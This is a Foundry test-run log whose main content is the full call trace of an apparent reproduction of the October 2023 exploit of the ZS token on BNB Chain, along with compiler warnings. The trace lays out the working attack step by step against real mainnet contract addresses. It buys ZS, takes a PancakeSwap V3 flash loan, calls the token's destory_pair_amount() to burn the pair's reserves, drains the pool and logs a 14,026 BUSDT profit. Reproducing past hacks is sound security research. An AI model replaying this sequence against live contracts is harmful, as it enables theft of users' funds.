Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.60s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-10/ZS_exp.sol:31:5:
   |
31 |     IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-10/ZS_exp.sol:73:5:
   |
73 |     IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 282.22ms (443.27µs CPU time)

Ran 1 test for src/test/2023-10/ZS_exp.sol:ZSExploit
[PASS] testExploit() (gas: 2238161)
Logs:
  Exploiter BUSDT balance before attack: 0.000000000000000000
  Exploiter BUSDT balance after attack: 14026.755365047874377260

Traces:
  [2397061] ZSExploit::testExploit()
    ├─ [0] VM::deal(ZSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 100000000000000000 [1e17])
    │   └─ ← [Return] 
    ├─ [2531] BUSDT::balanceOf(ZSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26510000000000000000 [2.651e19]
    ├─ [0] VM::record()
    │   └─ ← [Return] 
    ├─ [531] BUSDT::balanceOf(ZSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26510000000000000000 [2.651e19]
    ├─ [0] VM::accesses(BUSDT: [0x55d398326f99059fF775485246999027B3197955])
    │   └─ ← [Return] [0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96], []
    ├─ [0] VM::load(BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000016fe6708b439b0000
    ├─ [0] VM::load(BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000016fe6708b439b0000
    ├─ [531] BUSDT::balanceOf(ZSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26510000000000000000 [2.651e19]
    ├─ [0] VM::store(BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return] 
    ├─ [531] BUSDT::balanceOf(ZSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0x0000000000000000000000000000000000000000000000016fe6708b439b0000)
    │   └─ ← [Return] 
    ├─ emit SlotFound(who: BUSDT: [0x55d398326f99059fF775485246999027B3197955], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 81201235000773904770131445719184449197250777359516868712991521815545917127830 [8.12e76])
    ├─ [0] VM::load(BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000016fe6708b439b0000
    ├─ [0] VM::store(BUSDT: [0x55d398326f99059fF775485246999027B3197955], 0xb38645331535d8a24250bd866c230d0d85c11b90105fdba49ccc7bb4d9c6bc96, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return] 
    ├─ [531] BUSDT::balanceOf(ZSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [1950285] → new AttackContract@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   ├─ [24562] BUSDT::approve(PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ emit Approval(owner: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [108708] PancakeRouter::swapExactETHForTokens{value: 100000000000000000}(0, [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0x55d398326f99059fF775485246999027B3197955], AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1696786076 [1.696e9])
    │   │   ├─ [2893] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 13012954851397501811912038 [1.301e25], 61455308930072228359768 [6.145e22], 1696785076 [1.696e9]
    │   │   ├─ [23974] WBNB::deposit{value: 100000000000000000}()
    │   │   │   ├─ emit Deposit(dst: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 100000000000000000 [1e17])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [8062] WBNB::transfer(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, 100000000000000000 [1e17])
    │   │   │   ├─ emit Transfer(from: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], to: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, value: 100000000000000000 [1e17])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [53864] 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE::swap(21121692529689564510 [2.112e19], 0, AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
    │   │   │   ├─ [29971] BUSDT::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 21121692529689564510 [2.112e19])
    │   │   │   │   ├─ emit Transfer(from: 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE, to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 21121692529689564510 [2.112e19])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [531] BUSDT::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
    │   │   │   │   └─ ← [Return] 13012933729704972122347528 [1.301e25]
    │   │   │   ├─ [534] WBNB::balanceOf(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) [staticcall]
    │   │   │   │   └─ ← [Return] 61455408930072228359768 [6.145e22]
    │   │   │   ├─ emit Sync(reserve0: 13012933729704972122347528 [1.301e25], reserve1: 61455408930072228359768 [6.145e22])
    │   │   │   ├─ emit Swap(sender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 100000000000000000 [1e17], amount0Out: 21121692529689564510 [2.112e19], amount1Out: 0, to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] [100000000000000000 [1e17], 21121692529689564510 [2.112e19]]
    │   ├─ [531] BUSDT::balanceOf(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 21121692529689564510 [2.112e19]
    │   ├─ [140400] PancakeRouter::swapExactTokensForTokens(10560846264844782255 [1.056e19], 0, [0x55d398326f99059fF775485246999027B3197955, 0x12b3B6b1055B8Ad1aE8F60a0B6C79A9825Bcb4bC], AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1696786076 [1.696e9])
    │   │   ├─ [2893] ZS_BUSDT::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 196536297966296200282019977 [1.965e26], 22175225551627166211147 [2.217e22], 1696780903 [1.696e9]
    │   │   ├─ [10834] BUSDT::transferFrom(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], 10560846264844782255 [1.056e19])
    │   │   │   ├─ emit Transfer(from: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], value: 10560846264844782255 [1.056e19])
    │   │   │   ├─ emit Approval(owner: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039447023161648284857680 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [115704] ZS_BUSDT::swap(93321150801560412337223 [9.332e22], 0, AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
    │   │   │   ├─ [78759] ZS::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 93321150801560412337223 [9.332e22])
    │   │   │   │   ├─ [893] ZS_BUSDT::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 196536297966296200282019977 [1.965e26], 22175225551627166211147 [2.217e22], 1696780903 [1.696e9]
    │   │   │   │   ├─ [531] BUSDT::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 22185786397892010993402 [2.218e22]
    │   │   │   │   ├─ emit Transfer(from: ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], to: ZS: [0x12b3B6b1055B8Ad1aE8F60a0B6C79A9825Bcb4bC], value: 2799634524046812370116 [2.799e21])
    │   │   │   │   ├─ emit Transfer(from: ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 90521516277513599967107 [9.052e22])
    │   │   │   │   ├─ [2439] ZS_BUSDT::totalSupply() [staticcall]
    │   │   │   │   │   └─ ← [Return] 2090788957964562388641982 [2.09e24]
    │   │   │   │   ├─ [2531] BUSDT::balanceOf(ZS: [0x12b3B6b1055B8Ad1aE8F60a0B6C79A9825Bcb4bC]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [602] ZS::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   │   │   └─ ← [Return] 196442976815494639869682754 [1.964e26]
    │   │   │   ├─ [531] BUSDT::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   │   │   └─ ← [Return] 22185786397892010993402 [2.218e22]
    │   │   │   ├─ emit Sync(reserve0: 196442976815494639869682754 [1.964e26], reserve1: 22185786397892010993402 [2.218e22])
    │   │   │   ├─ emit Swap(sender: PancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 10560846264844782255 [1.056e19], amount0Out: 93321150801560412337223 [9.332e22], amount1Out: 0, to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Return] [10560846264844782255 [1.056e19], 93321150801560412337223 [9.332e22]]
    │   ├─ [3271] BUSDT::transfer(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], 1)
    │   │   ├─ emit Transfer(from: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], value: 1)
    │   │   └─ ← [Return] true
    │   ├─ [83643] ZS::transfer(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], 1000000000000000000 [1e18])
    │   │   ├─ [893] ZS_BUSDT::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 196442976815494639869682754 [1.964e26], 22185786397892010993402 [2.218e22], 1696785076 [1.696e9]
    │   │   ├─ [531] BUSDT::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   │   └─ ← [Return] 22185786397892010993403 [2.218e22]
    │   │   ├─ emit Transfer(from: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], value: 1000000000000000000 [1e18])
    │   │   └─ ← [Return] true
    │   ├─ [9045] ZS_BUSDT::sync()
    │   │   ├─ [602] ZS::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   │   └─ ← [Return] 196442977815494639869682754 [1.964e26]
    │   │   ├─ [531] BUSDT::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   │   └─ ← [Return] 22185786397892010993403 [2.218e22]
    │   │   ├─ emit Sync(reserve0: 196442977815494639869682754 [1.964e26], reserve1: 22185786397892010993403 [2.218e22])
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 7598 bytes of code
    ├─ [0] VM::roll(32429593 [3.242e7])
    │   └─ ← [Return] 
    ├─ [531] BUSDT::balanceOf(ZSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2425] BUSDT::decimals() [staticcall]
    │   └─ ← [Return] 18
    ├─ emit log_named_decimal_uint(key: "Exploiter BUSDT balance before attack", val: 0, decimals: 18)
    ├─ [179610] AttackContract::exploitZS()
    │   ├─ [2363] ZS::Burnamount() [staticcall]
    │   │   └─ ← [Return] 267056754175384170415736 [2.67e23]
    │   ├─ [602] ZS::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   └─ ← [Return] 196442977815494639869682754 [1.964e26]
    │   ├─ [5191] PancakeRouter::getAmountsIn(196175921061319255699267017 [1.961e26], [0x55d398326f99059fF775485246999027B3197955, 0x12b3B6b1055B8Ad1aE8F60a0B6C79A9825Bcb4bC]) [staticcall]
    │   │   ├─ [893] ZS_BUSDT::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 196442977815494639869682754 [1.964e26], 22185786397892010993403 [2.218e22], 1696785076 [1.696e9]
    │   │   └─ ← [Return] [16338194319064227641570788 [1.633e25], 196175921061319255699267017 [1.961e26]]
    │   ├─ [531] BUSDT::balanceOf(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 10560846264844782254 [1.056e19]
    │   ├─ [164411] BUSDT_USDC::flash(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 16339183758217962796788534 [1.633e25], 0, 0x0000000000000000000000000000000000000000000d83f4ed264184d52eab36)
    │   │   ├─ [2531] BUSDT::balanceOf(BUSDT_USDC: [0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb]) [staticcall]
    │   │   │   └─ ← [Return] 17536261963854517423912888 [1.753e25]
    │   │   ├─ [9796] 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d::balanceOf(BUSDT_USDC: [0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb]) [staticcall]
    │   │   │   ├─ [2553] 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C::balanceOf(BUSDT_USDC: [0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb]) [delegatecall]
    │   │   │   │   └─ ← [Return] 20516691047828675551482263 [2.051e25]
    │   │   │   └─ ← [Return] 20516691047828675551482263 [2.051e25]
    │   │   ├─ [6071] BUSDT::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 16339183758217962796788534 [1.633e25])
    │   │   │   ├─ emit Transfer(from: BUSDT_USDC: [0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 16339183758217962796788534 [1.633e25])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [114386] AttackContract::pancakeV3FlashCallback(8169591879108981398395 [8.169e21], 0, 0x0000000000000000000000000000000000000000000d83f4ed264184d52eab36)
    │   │   │   ├─ [531] BUSDT::balanceOf(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 16339194319064227641570788 [1.633e25]
    │   │   │   ├─ [5151] PancakeRouter::getAmountsOut(16338194319064227641570788 [1.633e25], [0x55d398326f99059fF775485246999027B3197955, 0x12b3B6b1055B8Ad1aE8F60a0B6C79A9825Bcb4bC]) [staticcall]
    │   │   │   │   ├─ [893] ZS_BUSDT::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 196442977815494639869682754 [1.964e26], 22185786397892010993403 [2.218e22], 1696785076 [1.696e9]
    │   │   │   │   └─ ← [Return] [16338194319064227641570788 [1.633e25], 196175921061319255699267017 [1.961e26]]
    │   │   │   ├─ [35095] ZS_BUSDT::swap(196175921061319255699267017 [1.961e26], 0, AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x5f)
    │   │   │   │   ├─ [14068] ZS::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 196175921061319255699267017 [1.961e26])
    │   │   │   │   │   ├─ [893] ZS_BUSDT::getReserves() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 196442977815494639869682754 [1.964e26], 22185786397892010993403 [2.218e22], 1696785076 [1.696e9]
    │   │   │   │   │   ├─ [531] BUSDT::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 22185786397892010993403 [2.218e22]
    │   │   │   │   │   ├─ emit Transfer(from: ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 196175921061319255699267017 [1.961e26])
    │   │   │   │   │   ├─ [439] ZS_BUSDT::totalSupply() [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 2090788957964562388641982 [2.09e24]
    │   │   │   │   │   ├─ [531] BUSDT::balanceOf(ZS: [0x12b3B6b1055B8Ad1aE8F60a0B6C79A9825Bcb4bC]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [5312] AttackContract::pancakeCall(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 196175921061319255699267017 [1.961e26], 0, 0x5f)
    │   │   │   │   │   ├─ [531] BUSDT::balanceOf(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 16339194319064227641570788 [1.633e25]
    │   │   │   │   │   ├─ [3271] BUSDT::transfer(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], 16338194319064227641570788 [1.633e25])
    │   │   │   │   │   │   ├─ emit Transfer(from: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], value: 16338194319064227641570788 [1.633e25])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ [602] ZS::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 267056754175384170415737 [2.67e23]
    │   │   │   │   ├─ [531] BUSDT::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 16360380105462119652564191 [1.636e25]
    │   │   │   │   ├─ emit Sync(reserve0: 267056754175384170415737 [2.67e23], reserve1: 16360380105462119652564191 [1.636e25])
    │   │   │   │   ├─ emit Swap(sender: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0In: 0, amount1In: 16338194319064227641570788 [1.633e25], amount0Out: 196175921061319255699267017 [1.961e26], amount1Out: 0, to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [20483] ZS::destory_pair_amount()
    │   │   │   │   ├─ emit Transfer(from: ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], to: 0x0000000000000000000000000000000000000000, value: 267056754175384170415736 [2.67e23])
    │   │   │   │   ├─ [9045] ZS_BUSDT::sync()
    │   │   │   │   │   ├─ [602] ZS::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 1
    │   │   │   │   │   ├─ [531] BUSDT::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 16360380105462119652564191 [1.636e25]
    │   │   │   │   │   ├─ emit Sync(reserve0: 1, reserve1: 16360380105462119652564191 [1.636e25])
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [602] ZS::balanceOf(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 196266441577596769299234124 [1.962e26]
    │   │   │   ├─ [5111] PancakeRouter::getAmountsOut(196266441577596769299234124 [1.962e26], [0x12b3B6b1055B8Ad1aE8F60a0B6C79A9825Bcb4bC, 0x55d398326f99059fF775485246999027B3197955]) [staticcall]
    │   │   │   │   ├─ [893] ZS_BUSDT::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 1, 16360380105462119652564191 [1.636e25], 1696785076 [1.696e9]
    │   │   │   │   └─ ← [Return] [196266441577596769299234124 [1.962e26], 16360380105462119652564190 [1.636e25]]
    │   │   │   ├─ [3271] BUSDT::transfer(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], 1)
    │   │   │   │   ├─ emit Transfer(from: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], value: 1)
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [602] ZS::balanceOf(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 196266441577596769299234124 [1.962e26]
    │   │   │   ├─ [9214] ZS::transfer(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], 196266441577596769299234124 [1.962e26])
    │   │   │   │   ├─ [893] ZS_BUSDT::getReserves() [staticcall]
    │   │   │   │   │   └─ ← [Return] 1, 16360380105462119652564191 [1.636e25], 1696785076 [1.696e9]
    │   │   │   │   ├─ [531] BUSDT::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 16360380105462119652564192 [1.636e25]
    │   │   │   │   ├─ emit Transfer(from: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], value: 196266441577596769299234124 [1.962e26])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [18440] ZS_BUSDT::swap(0, 16360380105462119652564190 [1.636e25], AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
    │   │   │   │   ├─ [3271] BUSDT::transfer(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 16360380105462119652564190 [1.636e25])
    │   │   │   │   │   ├─ emit Transfer(from: ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 16360380105462119652564190 [1.636e25])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [602] ZS::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 196266441577596769299234125 [1.962e26]
    │   │   │   │   ├─ [531] BUSDT::balanceOf(ZS_BUSDT: [0x162888d39Cfb0990699aD1EA252521b2982ad690]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 2
    │   │   │   │   ├─ emit Sync(reserve0: 196266441577596769299234125 [1.962e26], reserve1: 2)
    │   │   │   │   ├─ emit Swap(sender: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0In: 196266441577596769299234124 [1.962e26], amount1In: 1, amount0Out: 0, amount1Out: 16360380105462119652564190 [1.636e25], to: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [3271] BUSDT::transfer(BUSDT_USDC: [0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb], 16347353350097071778186929 [1.634e25])
    │   │   │   │   ├─ emit Transfer(from: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: BUSDT_USDC: [0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb], value: 16347353350097071778186929 [1.634e25])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [531] BUSDT::balanceOf(AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   │   │   └─ ← [Return] 14026755365047874377260 [1.402e22]
    │   │   │   ├─ [3271] BUSDT::transfer(ZSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14026755365047874377260 [1.402e22])
    │   │   │   │   ├─ emit Transfer(from: AttackContract: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: ZSExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 14026755365047874377260 [1.402e22])
    │   │   │   │   └─ ← [Return] true
